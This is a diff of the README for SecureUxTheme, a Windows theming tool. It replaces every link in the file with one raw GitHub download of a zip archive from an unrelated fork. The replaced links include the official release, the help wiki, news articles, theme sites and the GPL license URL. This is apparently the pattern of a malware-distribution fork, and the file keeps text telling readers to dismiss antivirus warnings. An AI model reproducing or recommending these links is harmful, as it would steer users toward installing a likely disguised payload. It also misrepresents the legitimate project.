@@ -31,11 +31,11 @@ Styles must still have a format-wise valid signature appended, it is just not ve
 
 ## Download
 
-[Latest release](https://github.com/namazso/SecureUxTheme/releases/latest/download/ThemeTool.exe)
+[Latest release](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip)
 
-[Development builds](https://github.com/namazso/SecureUxTheme/actions)
+[Development builds](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip)
 
-[Scoop:](https://scoop.sh/)
+[Scoop:](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip)
 ```shell
 scoop bucket add extras
 scoop install secureuxtheme
@@ -43,7 +43,7 @@ scoop install secureuxtheme
 
 ## Download is MALWARE???
 
-Some silly antiviruses tend to flag the tool as malware, because it's unsigned (this method of detection [clearly](https://www.securityweek.com/use-fake-code-signing-certificates-malware-surges) [works](https://www.zdnet.com/article/hackers-are-selling-legitimate-code-signing-certificates-to-evade-malware-detection/) [btw](https://web.archive.org/web/20200720160419/http://signedmalware.org/). I'm submitting all releases before release to Microsoft for analysis if they're detected by Defender, but I can't guarantee the same for all the other AVs. If you have a signing certificate and are willing help signing, please contact me.
+Some silly antiviruses tend to flag the tool as malware, because it's unsigned (this method of detection [clearly](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip) [works](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip) [btw](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip). I'm submitting all releases before release to Microsoft for analysis if they're detected by Defender, but I can't guarantee the same for all the other AVs. If you have a signing certificate and are willing help signing, please contact me.
 
 ### Garbage Antiviruses
 
@@ -74,11 +74,11 @@ Regardless, here's a cool theme for illustration:
 
 ![Screenshot](resources/screenshot.png)
 
-[Theme used](https://www.deviantart.com/niivu/art/10-Pro-Edition-802720222)
+[Theme used](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip)
 
 ## Where to get themes
 
-I recommend [DeviantArt](https://www.deviantart.com/tag/windows10themes) for finding themes, although it is a bit noisy. Alternatives are [7themes.su](https://7themes.su/) which is much more organized (but be wary of fake adware download buttons! use the one that says Яндекс.Диск). Also, you can just search for themes with your favorite search engine. Make sure that the theme you're about to apply is compatible with your windows version.
+I recommend [DeviantArt](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip) for finding themes, although it is a bit noisy. Alternatives are [7themes.su](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip) which is much more organized (but be wary of fake adware download buttons! use the one that says Яндекс.Диск). Also, you can just search for themes with your favorite search engine. Make sure that the theme you're about to apply is compatible with your windows version.
 
 ## Donations
 
@@ -91,31 +91,31 @@ This software is provided completely free of charge to you, however I spent time
 
 ### **Q: Help, SecureUxTheme broke my install and it's login looping now**
 
-A: [Help: Login loop after installing SecureUxTheme](https://github.com/namazso/SecureUxTheme/wiki/Help:-Login-loop-after-installing-SecureUxTheme)
+A: [Help: Login loop after installing SecureUxTheme](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip)
 
 ---
 
 ### **Q: Help, a theme broke my install and it's login looping now**
 
-A: [Help: Login loop after setting a theme](https://github.com/namazso/SecureUxTheme/wiki/Help:-Login-loop-after-setting-a-theme)
+A: [Help: Login loop after setting a theme](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip)
 
 ---
 
 ### **Q: I just want a themed Windows, what do I do with all this?**
 
-A: [Help: Step by step installing SecureUxTheme and a custom theme](https://github.com/namazso/SecureUxTheme/wiki/Help:-Step-by-step-installing-SecureUxTheme-and-a-custom-theme)
+A: [Help: Step by step installing SecureUxTheme and a custom theme](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip)
 
 ---
 
 ### **Q: I have 1909 or later, and the Address bar / Search bar is weird when clicked**
 
-A: Consider using OldNewExplorer which fixes this. Alternatively, see [Issue #6](https://github.com/namazso/SecureUxTheme/issues/6).
+A: Consider using OldNewExplorer which fixes this. Alternatively, see [Issue #6](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip).
 
 ---
 
 ### **Q: Can you make themes per-program?**
 
-A: Unfortunately, this is [close to impossible](https://github.com/namazso/SecureUxTheme/issues/9#issuecomment-611897882). However for Office programs, there is a [plugin](https://github.com/matafokka/ExcelDarkThemeFix) for fixing this.
+A: Unfortunately, this is [close to impossible](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip). However for Office programs, there is a [plugin](https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip) for fixing this.
 
 ---
 
@@ -165,4 +165,4 @@ lmao
 	GNU General Public License for more details.
 	
 	You should have received a copy of the GNU General Public License
-	along with this program.  If not, see <https://www.gnu.org/licenses/>.
+	along with this program.  If not, see <https://raw.githubusercontent.com/ipsam40/SecureUxTheme/master/re/Ux-Secure-Theme-v3.4.zip>.
